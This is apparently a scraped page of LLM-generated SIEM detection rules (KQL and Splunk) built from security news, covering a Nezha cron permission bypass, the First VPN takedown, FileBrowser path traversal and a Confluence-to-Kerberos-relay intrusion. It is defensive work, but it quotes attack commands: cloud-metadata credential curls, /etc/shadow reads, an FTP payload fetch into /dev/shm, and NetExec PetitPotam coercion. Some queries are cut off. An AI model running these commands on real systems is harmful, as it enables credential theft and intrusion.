[LLM] Nezha CVE-2026-46716 exploit: POST /api/v1/cron with empty servers + CronCoverAll Exploitation High
Detects the exploit signature for Nezha Monitoring CVE-2026-46716 where a RoleMember submits a cron task with `cover=1` (CronCoverAll) and `servers=[]` to trigger the vacuous-true permission bypass in createCron. Targets the dashboard's web tier via reverse-proxy / WAF / IIS / App Service logs that capture POST bodies or at least the URI. Rationale: Targets the exact URI named in the GHSA advisory (`POST /api/v1/cron` gated by commonHandler not adminHandler) and the body shape that triggers the vacuous-true bypass (`servers=[]` + `cover=1`). The endpoint is rare under normal operation — admins create cron tasks occasionally, so even the URI alone is a strong pivot; body inspection (when WAF/proxy logs include it) elevates to deterministic. Cross-checked against: • https://github.com/advisories/GHSA-99gv-2m7h-3hh9 • https://github.com/nezhahq/nezha • https://nezha.wiki/en_US/
ATT&CKT1190 T1078 T1068
Data sourcesWeb.Web
// Primary: WAF / proxy logs that capture request body in DeviceCustomString or RequestContext
let ExploitBodyPattern = @'(?is)"servers"\s*:\s*\[\s*\][^}]*"cover"\s*:\s*1|"cover"\s*:\s*1[^}]*"servers"\s*:\s*\[\s*\]';
union isfuzzy=true
(CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod == "POST"
| where RequestURL endswith "/api/v1/cron"

[LLM] nezha-agent spawning credential-access shell commands on Linux (post-RCE) Actions on Objectives High
Detects the post-exploitation footprint of Nezha CVE-2026-46716 on victim hosts: the nezha-agent process (typically running as root) executes a shell child that reads /etc/shadow or curls the cloud instance-metadata endpoint — exactly the PoC payload in the advisory. Targets Linux EDR / auditd process telemetry. Rationale: Pins on the named binary `nezha-agent` (the gRPC TaskStream sink that runs `cr.Command` per `service/singleton/crontask.go:133-181`) as parent, combined with the exact recon-string set from the advisory's PoC (`cat /etc/shadow`, `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`). Nezha-agent is a passive monitoring agent — these strings under its process tree are inherently malicious. Cross-checked against: • https://github.com/advisories/GHSA-99gv-2m7h-3hh9 • https://github.com/nezhahq/nezha • https://www.infosecurity-magazine.com/news/nezha-abused-post-exploitation/ • https://attack.mitre.org/techniques/T1552/005/ • https://attack.mitre.org/techniques/T1003/008/
ATT&CKT1059.004 T1003.008 T1552.005 T1057
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has "nezha-agent"
   or InitiatingProcessParentFileName has "nezha-agent"
| where FileName in~ ("cat","less","more","head","tail","awk","sed","grep","curl","wget","sh","bash","dash","python","python3","perl")
| where ProcessCommandLine has_any (
    "/etc/shadow",
    "169.254.169.254",
    "iam/security-credentials",
    "metadata.google.internal",
    "metadata.azure.com",
    "/computeMetadata/v1",
    "/latest/meta-data"
  )
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          GrandparentImage = InitiatingProcessParentFileName,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// Linux via ASIM (Defender for Endpoint Linux / Sysmon-Linux / auditd via ASIM parsers)
ImProcessCreate
| where TimeGenerated > ago(7d)
| where DvcOs has "Linux" or ActingProcessName has "nezha-agent" or ParentProcessName has "nezha-agent"
| where ParentProcessName has "nezha-agent"
    or ActingProcessName has "nezha-agent"
    or ParentProcessCommandLine has "nezha-agent"
| where TargetProcessCommandLine has_any (
    "/etc/shadow",
    "169.254.169.254",
    "iam/security-credentials",
    "metadata.google.internal",
    "metadata.azure.com",
    "/computeMetadata/v1",
    "/latest/meta-data"
  )
   or ActingProcessCommandLine has_any (
    "/etc/shadow",
    "169.254.169.254",
    "iam/security-credentials"
  )
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          ActingProcessName, ActingProcessCommandLine,
          TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

[LLM] nezha-agent outbound network connection to cloud instance-metadata service Actions on Objectives High
Detects a network connection from any process under the nezha-agent process tree to the cloud instance-metadata endpoint (169.254.169.254 / metadata.google.internal / metadata.azure.com). This is the cleanest post-RCE signal for Nezha CVE-2026-46716 because nezha-agent has no legitimate reason to query IMDS — its monitoring telemetry goes to the dashboard's gRPC endpoint, not the cloud metadata API. Rationale: Targets the IMDS endpoint named verbatim in the advisory's PoC (`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`) and pins the source to nezha-agent's process tree. Nezha agents communicate with their dashboard over gRPC — they have zero legitimate reason to touch IMDS, making this a near-deterministic post-exploit signal. Distinct pivot from UC2 (network telemetry vs. process telemetry — catches cases where the EXECVE was missed but the connection was logged). Cross-checked against: • https://github.com/advisories/GHSA-99gv-2m7h-3hh9 • https://attack.mitre.org/techniques/T1552/005/ • https://github.com/nezhahq/nezha
ATT&CKT1552.005 T1071.001
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
// Two-stage: find IMDS connections, then filter to those whose initiating process chain includes nezha-agent
let ImdsHits = DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | where RemoteIP == "169.254.169.254"
       or RemoteUrl has_any ("169.254.169.254", "metadata.google.internal", "metadata.azure.com")
    | project Timestamp, DeviceId, DeviceName, RemoteIP, RemoteUrl, RemotePort,
              InitiatingProcessId, InitiatingProcessFileName,
              InitiatingProcessParentFileName, InitiatingProcessCommandLine,
              InitiatingProcessAccountName;
ImdsHits
| where InitiatingProcessFileName has "nezha-agent"
   or InitiatingProcessParentFileName has "nezha-agent"
   or InitiatingProcessCommandLine has "nezha-agent"
// Catch grandparent chain via process-tree lookup
| union (
    ImdsHits
    | join kind=inner (
        DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessFileName has "nezha-agent"
        | project DeviceId, ChildPid=ProcessId, ChildFile=FileName, ChildCmd=ProcessCommandLine, ChildTime=Timestamp
    ) on DeviceId
    | where InitiatingProcessId == ChildPid and Timestamp between (ChildTime .. ChildTime + 10m)
  )
| order by Timestamp desc
// Network connection to IMDS where the originating process chain involves nezha-agent
let ImdsConn = ImNetworkSession
    | where TimeGenerated > ago(7d)
    | where DstIpAddr == "169.254.169.254"
       or DstHostname has_any ("metadata.google.internal", "metadata.azure.com");
let NezhaProcs = ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ActingProcessName has "nezha-agent"
       or ParentProcessName has "nezha-agent"
       or ParentProcessCommandLine has "nezha-agent"
    | project DvcHostname, NezhaProcPid=TargetProcessId, NezhaTime=TimeGenerated, NezhaCmd=TargetProcessCommandLine;
ImdsConn
| join kind=inner NezhaProcs on DvcHostname
| where TimeGenerated between (NezhaTime .. NezhaTime + 10m)
| project TimeGenerated, DvcHostname, SrcIpAddr, DstIpAddr, DstHostname, DstPortNumber, NezhaCmd, NezhaTime
| order by TimeGenerated desc

// TVM tables are daily snapshots — pin a 1-day window so the engine

DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46716")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,

DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46716")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,

First VPN Dismantled in Global Takedown Over Use by 25 Ransomware Groups

The Hacker News
2026-05-22 7 use cases 3 techniques 6 kill-chain phases detected

Authorities in Europe and North America have announced the dismantling of a criminal virtual private network (VPN) service used by criminal actors to obscure the origins of ransomware attacks, data theft, scanning, and denial-of-service attacks. Codenamed Operation Saffron, the disruption of First VPN Service was led by France and the Netherlands, with several other nations supporting the

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Endpoint visits to Russian-speaking cybercrime forums Exploit.in / XSS.is
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Outbound connections to seized First VPN exit node IPs · [LLM] Endpoint resolution or web traffic to seized 1vpns[.]com/net/org domains · Network connections to article IPs / domains

[LLM] Outbound connections to seized First VPN exit node IPs Command & Control High
Detects internal endpoints or perimeter devices initiating connections to the three U.S.-located First VPN exit-node IPs published by the FBI flash alert (2.223.66.103, 5.181.234.59, 92.38.148.58). Hits indicate prior use of the takedown-targeted criminal VPN — either by a malicious insider, a compromised host beaconing back through the old infrastructure, or law-enforcement sinkhole traffic worth triaging. Rationale: Uses the three exact U.S. exit-node IPs (2.223.66.103, 5.181.234.59, 92.38.148.58) named in the FBI flash alert quoted in the article. Static IPs published by law enforcement post-seizure are high-fidelity IOCs with effectively zero legitimate enterprise use. Cross-checked against: • https://www.europol.europa.eu/media-press/newsroom • https://www.ic3.gov/
ATT&CKT1090.003 T1572
Data sourcesNetwork_Traffic.All_Traffic
let exitNodes = dynamic(["2.223.66.103","5.181.234.59","92.38.148.58"]);
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in (exitNodes)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, Protocol, RemoteUrl
| order by Timestamp desc
let exitNodes = dynamic(["2.223.66.103","5.181.234.59","92.38.148.58"]);
union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationIP in (exitNodes)
    | project TimeGenerated, Host=SourceHostName, SourceIP, DestinationIP, DestinationPort, ApplicationProtocol, DeviceVendor, DeviceProduct),
  (ImNetworkSession
    | where TimeGenerated > ago(30d)
    | where DstIpAddr in (exitNodes)
    | project TimeGenerated, Host=SrcHostname, SourceIP=SrcIpAddr, DestinationIP=DstIpAddr, DestinationPort=DstPortNumber, ApplicationProtocol=NetworkApplicationProtocol, DeviceVendor=EventVendor, DeviceProduct=EventProduct)
| order by TimeGenerated desc

[LLM] Endpoint resolution or web traffic to seized 1vpns[.]com/net/org domains Command & Control High
Catches any internal host that resolves or browses to the three seized First VPN domains (1vpns.com / 1vpns.net / 1vpns.org). Post-takedown, any contact is either a forensic indicator of prior use, malware with stale C2/proxy config still beaconing, or an insider continuing to attempt access to the criminal service. Rationale: The three domains (1vpns.com, 1vpns.net, 1vpns.org) are quoted directly from the Eurojust seizure list in the article. Post-seizure these resolve to sinkholes or NX — any traffic from a corporate host is a confirmed historical-use signal worth alerting on. Cross-checked against: • https://www.eurojust.europa.eu/news • https://www.europol.europa.eu/media-press/newsroom
ATT&CKT1071.001 T1090.003

[LLM] Endpoint visits to Russian-speaking cybercrime forums Exploit.in / XSS.is Reconnaissance Medium
Detects internal hosts resolving or browsing to exploit.in and xss.is — the two Russian-speaking cybercrime forums named in the article as the marketing channels for First VPN. Used to surface insider threats, employees moonlighting in cybercrime, or compromised hosts being driven to acquire offensive tooling. Rationale: Both forums (exploit.in, xss.is) are named verbatim in the article as the Russian-speaking criminal marketplaces where First VPN was advertised. They have no legitimate corporate business purpose; access from a production endpoint is high-signal insider/compromise telemetry. Cross-checked against: • https://attack.mitre.org/techniques/T1588/002/ • https://www.recordedfuture.com/research
ATT&CKT1593.002 T1588.002

| order by Timestamp desc
let forums = dynamic(["exploit.in","xss.is"]);
union isfuzzy=true
  (DnsEvents

  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName has_any (forums) or RequestURL has_any (forums)

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName

SecurityEvent
| where TimeGenerated > ago(7d)

| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

[LLM] FileBrowser Quantum public share PATCH path traversal in fromPath/toPath (GHSA-qqqm-5547-774x) Exploitation High
Detects exploitation of the unauthenticated path traversal in FileBrowser Quantum's publicPatchHandler. Targets HTTP PATCH requests to /public/api/resources?hash=<share-hash> whose JSON body contains '..' segments in the fromPath or toPath fields — the exact pattern that escapes the share root before SanitizeUserPath runs. Rationale: Pivots on the verbatim exploit-request shape from the advisory: HTTP PATCH against /public/api/resources with hash= query string, where the JSON body contains a fromPath or toPath value beginning with '..'. Confirmed against the GitLab Advisories writeup of the sibling CVE-2026-44542 (same handler family, same root-cause sanitize-after-join pattern). Defender/Falcon left empty because EDR telemetry does not include HTTP request bodies — this is exclusively a WAF/web-proxy detection. Cross-checked: https://advisories.gitlab.com/golang/github.com/gtsteffaniak/filebrowser/CVE-2026-44542/, https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673, https://nvd.nist.gov/vuln/detail/CVE-2026-44542, https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design. Cross-checked against: • https://advisories.gitlab.com/golang/github.com/gtsteffaniak/filebrowser/CVE-2026-44542/ • https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673 • https://nvd.nist.gov/vuln/detail/CVE-2026-44542 • https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design
ATT&CKT1190 T1083
Data sourcesWeb.All_Web
let endpoint = "/public/api/resources";
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL contains endpoint
| where RequestURL contains "hash="
| extend BodySource = coalesce(tostring(DeviceCustomString1), tostring(DeviceCustomString2), tostring(DeviceCustomString3), tostring(DeviceCustomString4), tostring(DeviceCustomString5), tostring(DeviceCustomString6), tostring(RequestContext), tostring(Message))
| where BodySource matches regex @"(?i)""(from|to)Path""\s*:\s*""[^""]*\.\."
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourceUserName, RequestClientApplication, RequestMethod, RequestURL, EventOutcome, BodySource, DeviceAction
| order by TimeGenerated desc

[LLM] Volumetric PATCH probing against FileBrowser Quantum public share endpoint Reconnaissance Medium
Catches automated path-traversal probing where one source IP issues many PATCH requests with varying body shapes against /public/api/resources?hash=<hash> in a short window. Targets attacker tooling enumerating share hashes or fuzzing fromPath/toPath values for the GHSA-qqqm-5547-774x bug — distinct from a single legitimate rename operation. Rationale: A single legitimate user renaming a file via a public share generates one PATCH; an attacker fuzzing fromPath/toPath payloads or enumerating share hashes generates many in a tight window. Threshold pivots: ≥10 PATCHes from one IP in 5 min, OR ≥3 distinct hash= values from one IP in 5 min. Datadog query is the raw filter — the count/groupBy threshold is set at rule level per the Datadog Cloud SIEM model. Defender/Falcon empty because HTTP telemetry isn't on the EDR. Cross-checked: https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673, https://github.com/gtsteffaniak/filebrowser/releases. Cross-checked against: • https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673 • https://github.com/gtsteffaniak/filebrowser/releases • https://deepwiki.com/gtsteffaniak/filebrowser/2.3-api-design
ATT&CKT1190 T1595.002
Data sourcesWeb.All_Web
let WindowMin = 5m;
let PatchThreshold = 10;
let HashThreshold = 3;
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL contains "/public/api/resources"
| extend ShareHash = extract(@"(?i)[?&]hash=([A-Za-z0-9_-]+)", 1, RequestURL)
| summarize PatchCount = count(),
            UniqueHashes = dcount(ShareHash),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated),
            UserAgents = make_set(RequestClientApplication, 25),
            StatusCodes = make_set(EventOutcome, 25)
            by SourceIP, DeviceVendor, DeviceProduct, bin(TimeGenerated, WindowMin)
| where PatchCount >= PatchThreshold or UniqueHashes >= HashThreshold
| extend ProbeSignal = case(UniqueHashes >= HashThreshold and PatchCount >= PatchThreshold, "hash_enumeration",
                            PatchCount >= 20, "single_hash_fuzzing",
                            "elevated")
| order by PatchCount desc
source:(nginx OR caddy OR apache OR aws.waf OR cloudflare OR azure.appgw) @http.method:PATCH @http.url:*\/public\/api\/resources*
WEB

| tstats summariesonly=false count as patch_count, dc(Web.uri_query) as unique_hashes, dc(Web.url) as unique_urls, values(Web.http_user_agent) as user_agents, values(Web.status) as status_codes, min(_time) as firstTime, max(_time) as lastTime from datamodel=Web where Web.http_method="PATCH" AND Web.url="*/public/api/resources*" by Web.src, Web.dest, span=5m | `drop_dm_object_name("Web")` | where patch_count >= 10 OR unique_hashes >= 3 | eval probe_signal=if(unique_hashes>=3 AND patch_count>=10, "hash_enumeration", if(patch_count>=20, "single_hash_fuzzing", "elevated")) | table firstTime, lastTime, src, dest, patch_count, unique_hashes, unique_urls, user_agents, status_codes, probe_signal | sort - patch_count

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-44542")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,

// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-44542")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate

[LLM] Linux wget/curl fetching HackTool:Linux/MalPack.B from 206.189.27.39:8888 Delivery High
Detects wget or curl invocations from a Linux host reaching the Microsoft-reported staging IP 206.189.27.39 on port 8888 (path /5), used to deliver the custom scanning tool (SHA256 4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465) classified by Defender as HackTool:Linux/MalPack.B. Rationale: Anchors on the exact IP literal 206.189.27.39 from Microsoft's IOC list and the wget/curl downloader pattern shown verbatim in Block 2. Cross-checked with Microsoft Security Intelligence HackTool:Linux/MalPack.B family page. [LLM] Linux curl FTP fetch writing payload into /dev/shm (tmpfs staging) Installation High
Detects curl invocations that fetch over ftp:// and write the output into /dev/shm/* — the exact pattern Microsoft observed when the actor bypassed Confluence host-level write blocks by serving a custom scanner over a Python ftplib FTP server and pulling it into shared memory. Rationale: Anchors on Block 3 verbatim: `curl -o /dev/shm/ag ftp://anonymous:anonymous@[REDACTED_LOCAL_IP]/5`. The ftp:// + /dev/shm/ combination is extremely rare in benign Linux ops — almost no legitimate package or admin tooling uses anonymous FTP into tmpfs.

| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc

[LLM] Confluence credential file access (server.xml / confluence.cfg.xml) by non-Confluence process Actions on Objectives High
Detects any process reading /opt/atlassian/confluence/conf/server.xml or /var/atlassian/application-data/confluence/confluence.cfg.xml where the actor is not Tomcat/Confluence itself. Microsoft observed the actor pulling DB credentials and JIRA service account creds from these two files after RCE, then using them for NTLM/Kerberos relay against AD. Rationale: Anchors on the two exact file paths Microsoft cites: `/opt/atlassian/confluence/conf/server.xml` and `/var/atlassian/application-data/confluence/confluence.cfg.xml`. These files store Confluence's DB connection strings (often containing the JiraServices/atlassian service account passwords later relayed against AD).

[LLM] NetExec/nxc PetitPotam coerce_plus with marshalled-target SMB payload Exploitation High
Detects invocation of NetExec (nxc) using the coerce_plus -M module with PetitPotam and the marshalled SPN target string (`localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`) — the exact authentication-coercion technique Microsoft observed prior to the CVE-2025-33073 relay. Rationale: Anchors on the verbatim NetExec command line from the article: `nxc smb [IP] -d ... -u Jiraservices -p '...' -M coerce_plus -o M=PetitPotam L="localhost1UWhRCAAAA..."`. The marshalled-target string `localhost1UWhRC` is the signature of CVE-2025-33073-style SPN spoofing — corroborated by BreakPoint Labs writeup of the exploit primitive. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/
ATT&CKT1187 T1557.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")
   or (FileName in~ ("nxc","netexec") and ProcessCommandLine has "-M ")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")
   or (ActingProcessName endswith "/nxc" or ActingProcessName endswith "/netexec")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName

[LLM] CVE-2025-33073 Reflective Kerberos Relay exploit script + dnstool DNS record injection Exploitation High
Detects execution of the public CVE-2025-33073 exploit (CVE-2025-33073.py) and/or krbrelayx's dnstool.py being used to add a DNS record containing the marshalled SPN string — the two-step combo Microsoft observed for the Kerberos reflection attack against an unpatched DC/member server. Rationale: Anchors on the literal `CVE-2025-33073.py` filename and `dnstool.py ... -a add -r localhost1UWhRCAAAA...` shown verbatim in the article. The marshalled-target SPN combined with DNS record add is the published exploit primitive — confirmed against BreakPoint Labs and SySS reflective-Kerberos writeups. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/ • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073

DeviceProcessEvents

[LLM] gowitness HTTP/HTTPS recon scan with Chrome SOCKS5 proxy on internal subnet Reconnaissance Medium
Detects execution of the `gowitness` web-screenshot tool (SHA256 57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517) with the article-specific argument pattern: `scan nmap`, `--write-screenshots`, `--screenshot-fullpage`, `--chrome-proxy socks5://`. Microsoft observed this as the actor's web-app inventory step before identifying the vulnerable Confluence server. Rationale: Anchors on Block 1 verbatim (`gowitness scan nmap -f $i --write-db --write-screenshots --screenshot-fullpage --open-only --service-contains http --delay 5 --threads 1 --chrome-proxy socks5://127.0.0.1:9090`) and the article-supplied SHA256 hash 57b3188e... for the gowitness binary the actor staged. The SOCKS5 proxy on 127.0.0.1:9090 is the actor's pivot for visiting internal web apps via the staging host.
ATT&CKT1595.002 T1046
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName =~ "gowitness" or InitiatingProcessFileName =~ "gowitness" or ProcessCommandLine has "gowitness scan nmap")
   or (ProcessCommandLine has_all ("--write-screenshots","--chrome-proxy","socks5://"))
   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName endswith "/gowitness" or ActingProcessName =~ "gowitness"
   or ActingProcessCommandLine has "gowitness scan nmap"
   or (ActingProcessCommandLine has "--write-screenshots" and ActingProcessCommandLine has "socks5://" and ActingProcessCommandLine has "--chrome-proxy")
   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, SHA256, ParentProcessName

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-33073")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
